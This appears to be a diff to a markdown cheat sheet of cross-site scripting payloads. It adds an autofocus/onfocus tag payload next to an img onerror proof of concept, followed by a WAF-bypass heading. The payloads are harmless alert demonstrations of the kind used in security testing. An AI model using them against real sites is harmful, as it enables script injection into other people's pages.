@@ -41,6 +41,12 @@ The vulnerable parameter for XSS should have Unfiltered : **\[“ ‘ < > $ | ( 
 "><img%20src=x%20onerror="alert(%27POC%20By%20Xalgord%27)"
 ```
 
+**any name tag xss payload:**
+
+```
+<x onfocus=alert(1) autofocus tabindex=1>
+```
+
 **Bypass Waf Pyaload:**
 
 ```
